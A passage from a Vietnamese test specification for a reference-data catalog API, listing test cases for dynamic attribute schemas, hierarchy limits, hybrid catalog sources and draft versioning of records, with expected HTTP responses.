- **Truy vết** FR-07-010 · API-07-008
- **Tiền điều kiện / dữ liệu** Nhóm `HANH_CHINH` tồn tại.
- **Bước**
  1. Gọi `POST /catalog-groups` với `code` = `hanh_chinh`.
- **Mong đợi** `409` lỗi trùng mã (chi tiết chỉ rõ trường `code`). Không tạo nhóm mới.

### TS-07-03 · Lược đồ thuộc tính động và phân cấp

**Mục tiêu.** Xác nhận người soạn khai báo, sửa, ẩn, xóa, sắp thứ tự thuộc tính động trong bản nháp; hệ thống kiểm tra tương thích với dữ liệu hiện có (BR-07-013), chặn thuộc tính mức Nhạy cảm (BR-07-025), sinh đúng JSON Schema và cấu hình phân cấp đúng giới hạn (BR-07-014). Kịch bản thay thế LGC-DMDC-004, 010, 018 (hệ cũ chỉ có tên thuộc tính, thứ tự và trạng thái, không có kiểu).

**Phủ.** FR-07-005, 006, 007; BR-07-006, 013, 014, 025; API-07-022…025, 048; UI-07-04; ERR-07-004, 009, 011, 014, 036.

**Tiền điều kiện chung.** CAT-LH có bản nháp v2 (`DRAFT`) tạo từ v1; người gọi U-T68-DS-NV.

#### TC-07-024 · Thêm thuộc tính với đủ các kiểu dữ liệu và ràng buộc
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, IT
- **Truy vết** FR-07-005 · API-07-023, 022 · UI-07-04 · LGC-DMDC-004
- **Tiền điều kiện / dữ liệu** Bản nháp v2 của CAT-LH.
- **Bước**
  1. Lần lượt gọi `POST /catalogs/LOAI_HINH_TC/versions/draft/attributes` cho 11 thuộc tính, mỗi kiểu một thuộc tính: `STRING` (`maxLength` 50, `pattern` `^[A-Z]+$`), `TEXT`, `INTEGER` (`minValue` 0, `maxValue` 1000), `DECIMAL`, `BOOLEAN`, `DATE`, `DATETIME`, `ENUM` (`enumValues` `["A","B"]`), `CATALOG_REF` (`refCatalogCode` `DAN_TOC`), `URI`, `EMAIL`; tất cả không bắt buộc.
  2. Gọi `GET .../versions/draft/attributes`.
  3. Gọi `GET /catalogs/LOAI_HINH_TC/schema?version=draft`.
- **Mong đợi** Mỗi lệnh trả `201`. Bước 2 liệt kê 16 thuộc tính (5 cũ, 11 mới) theo `sortOrder`. Bước 3 trả JSON Schema (draft 2020-12) có `properties.attrs.properties` đủ 16 khóa, kiểu ánh xạ đúng (`DATE` thành `string` + `format: date`, `ENUM` thành `enum`, `CATALOG_REF` thành `string` kèm `x-ref-catalog`). Phiên bản v1 đã phát hành vẫn chỉ có 5 thuộc tính. KT: có (CREATE attribute_def × 11).

#### TC-07-025 · Chặn thuộc tính mức Nhạy cảm và tên gợi ý dữ liệu cá nhân
- **Loại** Âm, Bảo mật · **Ưu tiên** P1 · **Tự động** API, UT
- **Truy vết** FR-07-005 · BR-07-025 · ERR-07-036
- **Tiền điều kiện / dữ liệu** Bản nháp v2.
- **Bước**
  1. Gọi thêm thuộc tính với `{"code":"so_dinh_danh","label":"Số định danh cá nhân","dataType":"STRING"}`.
  2. Gọi thêm thuộc tính `{"code":"ghi_chu","dataType":"TEXT","dataClass":"NHAY_CAM"}` (khai báo mức Nhạy cảm).
  3. Gọi thêm thuộc tính `{"code":"ngay_sinh_nguoi_dai_dien","label":"Ngày sinh","dataType":"DATE"}`.
- **Mong đợi** Cả ba trả `422`, `ERR-07-036`, chi tiết nêu lý do (tên khớp danh sách từ khóa dữ liệu cá nhân hoặc mức phân loại bị cấm). Không thuộc tính nào được tạo.

> **Câu hỏi mở Q07-77:** Danh sách từ khóa gợi ý dữ liệu cá nhân (ví dụ `cccd`, `cmnd`, `dinh_danh`, `ngay_sinh`, `so_dien_thoai`, `ho_ten`) cần được ATTT và PH-09 thống nhất, cấu hình được theo nền tảng; TC-07-025 dùng bộ từ khóa mặc định trong SDD.

#### TC-07-026 · Thuộc tính CATALOG_REF trỏ danh mục không tồn tại và ràng buộc mâu thuẫn
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-005 · ERR-07-009
- **Tiền điều kiện / dữ liệu** Bản nháp v2.
- **Bước**
  1. Thêm thuộc tính `CATALOG_REF` với `refCatalogCode` = `KHONG_CO`.
  2. Thêm thuộc tính `INTEGER` với `minValue` 10, `maxValue` 5.
  3. Thêm thuộc tính `ENUM` với `enumValues` rỗng.
  4. Thêm thuộc tính có `code` = `ma` (trùng cột cố định `MA` của khuôn tệp).
- **Mong đợi** Mỗi lệnh trả `422`, `ERR-07-009` với mảng `errors` nêu trường sai (`refCatalogCode`, `minValue`, `enumValues`, `code`).

#### TC-07-027 · Không sửa lược đồ của phiên bản đã phát hành
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-005, 006 · BR-07-006 · ERR-07-004
- **Tiền điều kiện / dữ liệu** v1 của CAT-LH `PUBLISHED`.
- **Bước**
  1. Gọi `POST /catalogs/LOAI_HINH_TC/versions/1/attributes`.
  2. Gọi `PATCH /catalogs/LOAI_HINH_TC/versions/1/attributes/viet_tat`.
  3. Gọi `DELETE /catalogs/LOAI_HINH_TC/versions/1/attributes/viet_tat`.
- **Mong đợi** Cả ba trả `409`, `ERR-07-004`. `schema_hash` của v1 không đổi.

#### TC-07-028 · Sửa nhãn, sắp lại thứ tự và ẩn thuộc tính
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-006 · API-07-024 · UI-07-04 · LGC-DMDC-010, 018
- **Tiền điều kiện / dữ liệu** Bản nháp v2.
- **Bước**
  1. Gọi `PATCH .../attributes/viet_tat` thân `{"label":"Tên viết tắt","sortOrder":1}`.
  2. Gọi `PATCH .../attributes/website` thân `{"status":"HIDDEN"}`.
  3. Trên UI-07-04 kéo thả thuộc tính `cap_quan_ly` lên đầu danh sách và lưu.
  4. Gọi `GET /catalogs/LOAI_HINH_TC/import-template?format=xlsx` (theo bản nháp).
- **Mong đợi** Các lệnh trả `200`. Thứ tự mới được lưu. Thuộc tính `website` HIDDEN không hiện trong tệp mẫu và không trả trong API khai thác sau khi phát hành, nhưng giá trị cũ vẫn được giữ trong `attrs`. Bộ phân loại khác biệt coi đổi nhãn, thứ tự, ẩn là thay đổi không phá vỡ.

#### TC-07-029 · Đổi kiểu thuộc tính khi mọi giá trị chuyển đổi được
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, UT
- **Truy vết** FR-07-006 · BR-07-013 · API-07-024
- **Tiền điều kiện / dữ liệu** Thuộc tính `ma_so` STRING có giá trị "001", "25", "300" trên 3 bản ghi của bản nháp.
- **Bước**
  1. Gọi `PATCH .../attributes/ma_so` thân `{"dataType":"INTEGER"}`.
  2. Gọi `GET .../versions/draft/diff?against=current`.
- **Mong đợi** Bước 1 trả `200`; giá trị trong `attrs` được chuyển thành số 1, 25, 300. Bước 2 có mục `ATTRIBUTE_TYPE_CHANGED` đánh dấu `breaking = true` (đổi kiểu là phá vỡ theo khung §3.18).

#### TC-07-030 · Đổi kiểu thuộc tính khi có giá trị không chuyển được
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-006 · BR-07-013 · ERR-07-014
- **Tiền điều kiện / dữ liệu** `viet_tat` STRING có giá trị "UBND", "SNV".
- **Bước**
  1. Gọi `PATCH .../attributes/viet_tat` thân `{"dataType":"INTEGER"}`.
  2. Gọi `PATCH .../attributes/ngay_thanh_lap` thân `{"dataType":"BOOLEAN"}`.
- **Mong đợi** Cả hai trả `422`, `ERR-07-014`, chi tiết liệt kê tối đa 20 mã bản ghi có giá trị không chuyển được và tổng số. Lược đồ không đổi.

#### TC-07-031 · Thu hẹp ràng buộc độ dài và miền giá trị
- **Loại** Âm, Biên · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-006 · BR-07-013 · ERR-07-014
- **Tiền điều kiện / dữ liệu** `viet_tat` `maxLength` 20, giá trị dài nhất 12 ký tự; `cap_quan_ly` ENUM {`TINH`,`XA`} có cả hai giá trị được dùng.
- **Bước**
  1. Gọi đổi `maxLength` thành 12.
  2. Gọi đổi `maxLength` thành 11.
  3. Gọi đổi `enumValues` thành `["TINH"]`.
- **Mong đợi** Bước 1 trả `200` và diff đánh dấu thay đổi phá vỡ (thu hẹp ràng buộc). Bước 2 trả `422` `ERR-07-014` (giá trị 12 ký tự vi phạm). Bước 3 trả `422` `ERR-07-014`.

#### TC-07-032 · Xóa thuộc tính trong bản nháp
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-006 · BR-07-013 · API-07-025
- **Tiền điều kiện / dữ liệu** Bản nháp v2 có `so_bien_che` với giá trị trên 39 bản ghi.
- **Bước**
  1. Gọi `DELETE .../versions/draft/attributes/so_bien_che`.
  2. Gọi `GET .../versions/draft/diff?against=current`.
- **Mong đợi** Bước 1 trả `204`; khóa `so_bien_che` bị gỡ khỏi `attrs` của bản ghi trong bản nháp (v1 giữ nguyên). Bước 2 có `ATTRIBUTE_REMOVED` với `breaking = true`; vì có thay đổi phá vỡ, phiên bản phải qua duyệt (BR-07-012).

#### TC-07-033 · Thêm thuộc tính bắt buộc không có giá trị mặc định khi đã có bản ghi
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-005 · BR-07-013 · ERR-07-014
- **Tiền điều kiện / dữ liệu** Bản nháp v2 có 39 bản ghi.
- **Bước**
  1. Thêm thuộc tính `ma_qhns` STRING `required = true`, không `defaultValue`.
  2. Thêm lại với `defaultValue` = "CHUA_CO".
- **Mong đợi** Bước 1 trả `422` `ERR-07-014`. Bước 2 trả `201`, 39 bản ghi nhận giá trị mặc định.

#### TC-07-034 · Bật ràng buộc duy nhất khi dữ liệu đang trùng
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-006 · BR-07-013 · ERR-07-014
- **Tiền điều kiện / dữ liệu** Hai bản ghi có `viet_tat` = "SNV".
- **Bước**
  1. Gọi `PATCH .../attributes/viet_tat` thân `{"uniqueInVersion":true}`.
- **Mong đợi** `422`, `ERR-07-014`, chi tiết nêu giá trị trùng "SNV" và hai mã bản ghi.

#### TC-07-035 · Cấu hình phân cấp: bật cây, số cấp, tên cấp
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-007 · BR-07-014 · API-07-002, 004 · UI-07-03 · LGC-DMDC-002
- **Tiền điều kiện / dữ liệu** Danh mục mới `TC035_CAY` phẳng, DRAFT.
- **Bước**
  1. Gọi `PATCH /catalogs/TC035_CAY` thân `{"isHierarchical":true,"maxDepth":4,"levelNames":["Cấp 1","Cấp 2","Cấp 3","Cấp 4"]}`.
  2. Thêm 4 bản ghi lồng nhau `A`, `A.1` (cha `A`), `A.1.1`, `A.1.1.1`.
  3. Mở tab Bản ghi dạng cây trên UI-07-02.
- **Mong đợi** Bước 1 trả `200`. Bước 2 thành công, `depth` lần lượt 1…4, `levelName` đúng tên cấp, `path` đúng chuỗi tổ tiên. Cây hiển thị 4 cấp.

#### TC-07-036 · Số cấp tối đa vượt giới hạn 10
- **Loại** Âm, Biên · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-007 · BR-07-014
- **Tiền điều kiện / dữ liệu** `TC035_CAY`.
- **Bước**
  1. Đặt `maxDepth` = 10 với 10 tên cấp.
  2. Đặt `maxDepth` = 11.
  3. Đặt `maxDepth` = 3 nhưng `levelNames` có 2 phần tử.
- **Mong đợi** Bước 1 trả `200`. Bước 2 và 3 trả `422` lỗi kiểm tra hợp lệ (trường `maxDepth`, `levelNames`).

#### TC-07-037 · Giảm số cấp dưới độ sâu dữ liệu hiện có
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-007 · BR-07-014 · ERR-07-011
- **Tiền điều kiện / dữ liệu** `TC035_CAY` có bản ghi độ sâu 4.
- **Bước**
  1. Gọi `PATCH /catalogs/TC035_CAY` thân `{"maxDepth":3,"levelNames":["Cấp 1","Cấp 2","Cấp 3"]}`.
- **Mong đợi** `422`, `ERR-07-011`, chi tiết nêu mã `A.1.1.1` vượt cấp.

#### TC-07-038 · JSON Schema sinh từ định nghĩa kiểm tra đúng bản ghi
- **Loại** Dương, Âm · **Ưu tiên** P2 · **Tự động** UT (jqwik)
- **Truy vết** FR-07-005, 013, 033 · ADR-050
- **Tiền điều kiện / dữ liệu** Bộ sinh định nghĩa thuộc tính ngẫu nhiên (jqwik) gồm mọi kiểu và ràng buộc.
- **Bước**
  1. Với mỗi định nghĩa ngẫu nhiên, sinh JSON Schema; sinh 100 giá trị hợp lệ và 100 giá trị vi phạm từng ràng buộc.
  2. Kiểm tra bằng bộ kiểm tra JSON Schema (networknt) và bằng bộ kiểm tra nghiệp vụ của PH-07.
- **Mong đợi** Giá trị hợp lệ được chấp nhận, giá trị vi phạm bị từ chối; hai bộ kiểm tra cho kết quả giống nhau 100%.

### TS-07-04 · Nguồn danh mục, quyền cập nhật và mở rộng HYBRID

**Mục tiêu.** Xác nhận ba loại nguồn (`LOCAL`, `NATIONAL`, `HYBRID`) được thiết lập đúng, danh mục NATIONAL chỉ cập nhật qua đồng bộ, danh mục HYBRID chỉ chứa bản ghi bổ sung trong dải mã địa phương và khi tra cứu trả hợp của bản COMMON hiệu lực với phần bổ sung (ADR-052). Thay thế cờ `Is_update` của Aita (LGC-DMDC-017).

**Phủ.** FR-07-008, 048; BR-07-009, 010; UC-07-17; API-07-002, 004, 027, 041, 042; ERR-07-003, 008, 012.

**Tiền điều kiện chung.** CAT-DT, CAT-DT68 như mục 2.3; người gọi U-T68-DS-NV.

#### TC-07-039 · Tạo danh mục HYBRID mở rộng danh mục COMMON
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-008, 048 · UC-07-17 · API-07-002 · LGC-DMDC-017
- **Tiền điều kiện / dữ liệu** `QUOC_TICH` (COMMON) ACTIVE.
- **Bước**
  1. Gọi `POST /catalogs` thân `{"code":"TC039_QT_T68","name":"Quốc tịch mở rộng T68","sourceType":"HYBRID","extendsCatalogCode":"QUOC_TICH","localCodePattern":"^68\\.[0-9]{2}$"}`.
  2. Gọi `GET /catalogs/TC039_QT_T68`.
- **Mong đợi** `201`; `extendsCatalogId` trỏ đúng `QUOC_TICH` COMMON; lược đồ thuộc tính của bản nháp kế thừa từ phiên bản hiện hành của danh mục gốc (chỉ đọc), không thêm được thuộc tính bắt buộc mới. EVT-07-01 phát.

#### TC-07-040 · Thêm bản ghi bổ sung trong dải mã địa phương
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-008, 048 · BR-07-010 · API-07-027
- **Tiền điều kiện / dữ liệu** CAT-DT68 có bản nháp.
- **Bước**
  1. Gọi `POST /catalogs/DAN_TOC_T68/versions/draft/items` thân `{"code":"68.03","name":"Nhóm địa phương thử"}`.
- **Mong đợi** `201`; bản ghi có `isLocalExtension = true`. KT: có.

#### TC-07-041 · Thêm bản ghi HYBRID ngoài dải mã địa phương
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-008 · BR-07-010 · ERR-07-012 · AT-07-007 (SRS cũ)
- **Tiền điều kiện / dữ liệu** CAT-DT68 có bản nháp.
- **Bước**
  1. Thêm bản ghi `code` = `69.01`.
  2. Thêm bản ghi `code` = `68.1`.
- **Mong đợi** Cả hai trả `422`, `ERR-07-012`, chi tiết có biểu thức dải hợp lệ `^68\.[0-9]{2}$`.

#### TC-07-042 · Bản ghi HYBRID trùng mã danh mục gốc
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** BR-07-010 · ERR-07-008
- **Tiền điều kiện / dữ liệu** Danh mục HYBRID `TC042_DT` với dải rộng `^[0-9]{2}$` (cố ý chồng lấn với mã gốc `01`…`55`).
- **Bước**
  1. Thêm bản ghi `code` = `05`.
  2. Thêm bản ghi `code` = `90`.
- **Mong đợi** Bước 1 trả `409`, `ERR-07-008` (trùng mã của danh mục gốc). Bước 2 trả `201`.

> **Câu hỏi mở Q07-78:** Khi tạo danh mục HYBRID, có nên chặn ngay biểu thức dải mã địa phương chồng lấn với mã hiện có của danh mục gốc hay chỉ chặn từng bản ghi như TC-07-042? Ca kiểm thử hiện theo cách chặn từng bản ghi.

#### TC-07-043 · Tra cứu danh mục HYBRID trả hợp bản COMMON và phần bổ sung
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, IT
- **Truy vết** FR-07-048, 028, 026 · ADR-052 · API-07-041, 042
- **Tiền điều kiện / dữ liệu** CAT-DT68 v1 đã phát hành với 2 bản ghi bổ sung; `DAN_TOC` COMMON có 55 bản ghi. Người gọi APP-T68-READ.
- **Bước**
  1. Gọi `GET /catalogs/DAN_TOC_T68/items?limit=1000`.
  2. Gọi `GET /catalogs/DAN_TOC_T68/items/05`.
  3. Gọi `GET /catalogs/DAN_TOC_T68/items/68.01`.
  4. Gọi `GET /catalogs/DAN_TOC/items/68.01` bằng APP-T68-READ.
- **Mong đợi** Bước 1 trả 57 bản ghi, phần bổ sung có `isLocalExtension = true`. Bước 2 trả bản ghi gốc. Bước 3 trả bản ghi bổ sung. Bước 4 trả `404` `ERR-07-007` (bản ghi địa phương không lẫn vào danh mục COMMON).

#### TC-07-044 · Tenant sửa bản ghi gốc qua danh mục HYBRID hoặc trực tiếp danh mục COMMON
- **Loại** Âm, Bảo mật · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-048 · BR-07-009, 010 · ERR-07-003
- **Tiền điều kiện / dữ liệu** CAT-DT68 có bản nháp; người gọi U-T68-TA.
- **Bước**
  1. Gọi `PATCH /catalogs/DAN_TOC_T68/versions/draft/items/05` sửa tên.
  2. Gọi `POST /catalogs/DAN_TOC/versions` (tạo bản nháp danh mục COMMON).
  3. Gọi `POST /catalogs/DAN_TOC/versions/draft/items`.
- **Mong đợi** Cả ba trả `403`, `ERR-07-003`. Không có thay đổi trong dữ liệu COMMON (kiểm tra `updated_at` của danh mục `DAN_TOC`). EVT: không.

#### TC-07-045 · Không sửa thủ công danh mục NATIONAL
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-008 · BR-07-009 · ERR-07-003 · AT-07-005 (SRS cũ)
- **Tiền điều kiện / dữ liệu** Danh mục `TC045_NAT` của T68 `sourceType = NATIONAL` được tạo bởi đồng bộ.
- **Bước**
  1. Người dùng U-T68-TA gọi `POST /catalogs/TC045_NAT/versions`.
  2. Gọi `POST /import-jobs` nhập vào `TC045_NAT`.
  3. Gọi `PATCH /catalogs/TC045_NAT` đổi `sourceType` thành `LOCAL`.
- **Mong đợi** Bước 1, 2 trả `403` `ERR-07-003`. Bước 3 trả `403` `ERR-07-003` (không đổi nguồn của danh mục đã gắn đồng bộ; muốn tách phải gỡ nguồn đồng bộ trước theo quy trình ở FRS).

#### TC-07-046 · Danh mục HYBRID tự theo phiên bản mới của danh mục gốc
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** IT
- **Truy vết** FR-07-048 · ADR-052 · EVT-07-05
- **Tiền điều kiện / dữ liệu** U-PA phát hành `DAN_TOC` v mới thêm mã `56` hiệu lực 2026-11-21.
- **Bước**
  1. Sau khi nhận sự kiện `common.rdm.catalog.published.v1`, gọi `GET /catalogs/DAN_TOC_T68/items/56` bằng APP-T68-READ.
  2. Gọi `GET /catalogs/DAN_TOC_T68/items/56?at=2026-11-20`.
- **Mong đợi** Bước 1 trả `200` trong vòng 5 giây sau sự kiện (con trỏ hiệu lực được làm mới). Bước 2 trả `404` `ERR-07-007` (trước ngày hiệu lực).

### TS-07-05 · Bản nháp và bản ghi

**Mục tiêu.** Xác nhận cơ chế phiên bản sao chép khi ghi (copy-on-write): tạo bản nháp từ phiên bản hiện hành, thêm, sửa, ngừng dùng, khôi phục, xóa bản ghi trên bản nháp; kiểm tra hợp lệ đầy đủ (kiểu, bắt buộc, duy nhất, mã cha, vòng, độ sâu); hủy bản nháp; bảo đảm phiên bản đã phát hành không bị ảnh hưởng. Thay thế LGC-DMDC-011 (hệ cũ sửa trực tiếp, không có phiên bản).

**Phủ.** FR-07-011, 012, 013, 017, 018, 019; BR-07-002, 003, 004, 005, 006, 014; UC-07-02; API-07-012…016, 026…030, 044; UI-07-05; ERR-07-004, 005, 008, 009, 010, 011, 013, 018.

**Tiền điều kiện chung.** CAT-LH v1 PUBLISHED, chưa có phiên bản mở (trừ khi ca ghi khác); người gọi U-T68-DS-NV.

#### TC-07-047 · Tạo bản nháp từ phiên bản hiện hành
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, IT
- **Truy vết** FR-07-011 · API-07-012 · UC-07-02 · ADR-051 · LGC-DMDC-011
- **Tiền điều kiện / dữ liệu** CAT-LH v1 có 39 bản ghi, 5 thuộc tính.
- **Bước**
  1. Gọi `POST /catalogs/LOAI_HINH_TC/versions` với `Idempotency-Key`.
  2. Gọi `GET /catalogs/LOAI_HINH_TC/versions/draft`.
  3. Truy vấn CSDL: đếm `catalog_item` và `attribute_def` theo `version_id` của bản nháp.
- **Mong đợi** `201`; bản nháp `version_no = 2`, `status = DRAFT`, `origin = MANUAL`, `effective_from` rỗng. Số bản ghi 39 và số thuộc tính 5 sao chép đầy đủ với `id` mới, cùng `code`. `catalog.current_version_id` vẫn trỏ v1. KT: có (CREATE catalog_version). EVT: không.

#### TC-07-048 · Không tạo bản nháp thứ hai khi đã có phiên bản mở
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-011 · BR-07-005 · ERR-07-005
- **Tiền điều kiện / dữ liệu** Lặp lại cho ba trạng thái phiên bản mở: `DRAFT`, `IN_REVIEW`, `APPROVED`.
- **Bước**
  1. Với mỗi trạng thái, gọi `POST /catalogs/LOAI_HINH_TC/versions` với `Idempotency-Key` mới.
  2. Gửi đồng thời hai yêu cầu tạo bản nháp (hai luồng) khi chưa có phiên bản mở.
- **Mong đợi** Bước 1 trả `409` `ERR-07-005` cả ba lần, chi tiết có `versionNo` đang mở. Bước 2: đúng một yêu cầu trả `201`, yêu cầu kia `409` `ERR-07-005` (chỉ mục duy nhất từng phần chặn tranh chấp).

#### TC-07-049 · Sửa ngày hiệu lực, căn cứ pháp lý, ghi chú của bản nháp
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-016 · API-07-014
- **Tiền điều kiện / dữ liệu** Bản nháp v2.
- **Bước**
  1. Gọi `PATCH /catalogs/LOAI_HINH_TC/versions/draft` với `If-Match`, thân `{"effectiveFrom":"2026-12-01","legalBasis":"Quyết định số 99/QĐ-UBND (giả lập)","changeNote":"Bổ sung loại hình"}`.
- **Mong đợi** `200`, các trường được lưu; `ETag` tăng.

#### TC-07-050 · Thêm bản ghi hợp lệ vào bản nháp
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-012, 013 · API-07-027 · UI-07-05
- **Tiền điều kiện / dữ liệu** Bản nháp v2.
- **Bước**
  1. Gọi `POST .../versions/draft/items` thân `{"code":"kh01.l01.p10","name":"Phân loại thử","parentCode":"KH01.L01","sortOrder":10,"attrs":{"viet_tat":"PLT","cap_quan_ly":"TINH","ngay_thanh_lap":"2026-01-15"}}`.
  2. Trên UI-07-05, thêm một bản ghi bằng biểu mẫu.
- **Mong đợi** `201`; mã lưu chuẩn hóa `KH01.L01.P10`; `depth = 3`, `path = ["KH01","KH01.L01"]`, `status = ACTIVE`, `nameSearch` = "phan loai thu". `item_count` của bản nháp tăng. KT: có.

#### TC-07-051 · Thêm bản ghi trùng mã khác hoa thường
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-012, 013 · BR-07-002 · ERR-07-008
- **Tiền điều kiện / dữ liệu** Bản nháp có `KH01.L01.P10`.
- **Bước**
  1. Thêm bản ghi `code` = `Kh01.l01.p10`.
  2. Thêm bản ghi `code` = ` KH01.L01.P10 ` (khoảng trắng đầu cuối).
- **Mong đợi** Cả hai trả `409`, `ERR-07-008`.

#### TC-07-052 · Giá trị thuộc tính vi phạm lược đồ
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API, UT
- **Truy vết** FR-07-013 · ERR-07-009
- **Tiền điều kiện / dữ liệu** Bản nháp v2.
- **Bước**
  1. Thêm bản ghi với `attrs` đồng thời sai: `ngay_thanh_lap` = "2026-02-30", `cap_quan_ly` = "HUYEN", `viet_tat` dài 21 ký tự, `so_bien_che` = "mười", `website` = "khong-phai-uri", thêm khóa lạ `khong_khai_bao`.
  2. Thêm bản ghi thiếu `name`.
  3. Thêm bản ghi `code` = `KH-01/ABC` (vi phạm T-CODE).
- **Mong đợi** Bước 1 trả `422` `ERR-07-009` với mảng `errors` có đúng 6 phần tử (mỗi phần tử `{field, code, message}`), báo đủ lỗi một lần chứ không dừng ở lỗi đầu. Bước 2, 3 trả `422` `ERR-07-009`. Không bản ghi nào được tạo.

#### TC-07-053 · Mã cha không tồn tại và vượt số cấp tối đa
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-013 · BR-07-014 · ERR-07-010, ERR-07-011
- **Tiền điều kiện / dữ liệu** CAT-LH `maxDepth = 3`.
- **Bước**
  1. Thêm bản ghi `parentCode` = `KH99`.
  2. Thêm bản ghi `parentCode` = `KH01.L01.P01` (sẽ ở cấp 4).
- **Mong đợi** Bước 1 trả `422` `ERR-07-010`. Bước 2 trả `422` `ERR-07-011`.

#### TC-07-054 · Đổi mã cha tạo vòng
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API, UT
- **Truy vết** FR-07-013 · BR-07-014 · API-07-028 · ERR-07-010
- **Tiền điều kiện / dữ liệu** `KH01` là cha của `KH01.L01`.
- **Bước**
  1. Gọi `PATCH .../items/KH01` thân `{"parentCode":"KH01.L01"}`.
  2. Gọi `PATCH .../items/KH01` thân `{"parentCode":"KH01"}` (tự làm cha mình).
- **Mong đợi** Cả hai trả `422` `ERR-07-010` (chi tiết "tạo vòng"). Cây không đổi.

#### TC-07-055 · Ngừng dùng bản ghi kèm mã thay thế
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-012, 019 · BR-07-003, 004 · API-07-029 · UI-07-05
- **Tiền điều kiện / dữ liệu** Bản nháp v2; `KH02.L03.P01` đã phát hành ở v1, không có con.
- **Bước**
  1. Gọi `POST .../items/KH02.L03.P01:deprecate` thân `{"replacedBy":["KH02.L03.P02"],"reason":"Gộp loại hình"}`.
  2. Phát hành v2 (qua luồng duyệt chuẩn TS-07-07).
  3. Gọi `GET /catalogs/LOAI_HINH_TC/items/KH02.L03.P01` bằng APP-T68-READ.
- **Mong đợi** Bước 1 trả `200`, `status = DEPRECATED`, `replacedBy` lưu đúng. Bước 3 trả `200` kèm `status = DEPRECATED`, `replacedBy = ["KH02.L03.P02"]` (BR-07-004). Bộ phân loại khác biệt đánh dấu ngừng dùng mã là phá vỡ.

#### TC-07-056 · Ngừng dùng bản ghi cha còn con hoạt động và mã thay thế không tồn tại
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-019 · BR-07-014 · ERR-07-010, ERR-07-009
- **Tiền điều kiện / dữ liệu** `KH01.L01` có 3 con ACTIVE.
- **Bước**
  1. Gọi `POST .../items/KH01.L01:deprecate` không kèm tùy chọn ngừng dùng cả nhánh.
  2. Gọi `POST .../items/KH01.L02.P01:deprecate` thân `{"replacedBy":["KHONG_CO"]}`.
  3. Gọi `POST .../items/KH01.L02.P02:deprecate` thân `{"replacedBy":["KH01.L02.P02"]}` (tự thay thế).
- **Mong đợi** Bước 1 trả `422` `ERR-07-010` (bản ghi ACTIVE không được có cha DEPRECATED). Bước 2, 3 trả `422` `ERR-07-009` (trường `replacedBy`).

#### TC-07-057 · Khôi phục bản ghi đã ngừng dùng trong bản nháp mới
- **Loại** Dương · **Ưu tiên** P3 · **Tự động** API
- **Truy vết** FR-07-012 · API-07-028
- **Tiền điều kiện / dữ liệu** v2 đã phát hành với `KH02.L03.P01` DEPRECATED; tạo bản nháp v3.
- **Bước**
  1. Gọi `PATCH .../versions/draft/items/KH02.L03.P01` thân `{"status":"ACTIVE","replacedBy":[]}`.
  2. Gọi `GET .../versions/draft/diff?against=current`.
- **Mong đợi** `200`; bản ghi ACTIVE trong v3; diff ghi `CHANGED` (trạng thái), không phá vỡ.

> **Câu hỏi mở Q07-79:** Khung chung không nói rõ có cho khôi phục bản ghi đã ngừng dùng hay không. TC-07-057 giả định cho phép trong bản nháp mới (vì không vi phạm BR-07-003), cần FRS xác nhận.

#### TC-07-058 · Không xóa bản ghi đã từng phát hành
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-012 · BR-07-003 · API-07-030 · ERR-07-013 · AT-07-004 (SRS cũ)
- **Tiền điều kiện / dữ liệu** Bản nháp v2; `KH01` đã phát hành ở v1.
- **Bước**
  1. Gọi `DELETE .../versions/draft/items/KH01`.
- **Mong đợi** `409`, `ERR-07-013`, chi tiết gợi ý dùng ngừng dùng. Bản ghi giữ nguyên.

#### TC-07-059 · Xóa bản ghi mới thêm trong bản nháp
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-012 · API-07-030
- **Tiền điều kiện / dữ liệu** `KH01.L01.P10` vừa thêm ở TC-07-050 (chưa từng phát hành).
- **Bước**
  1. Gọi `DELETE .../versions/draft/items/KH01.L01.P10`.
- **Mong đợi** `204`; bản ghi bị xóa vật lý khỏi bản nháp; diff không còn mục `ADDED` tương ứng. KT: có.

#### TC-07-060 · Sửa bản ghi bằng If-Match
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-012 · API-07-028 · UI-07-05 · LGC-DMDC-011
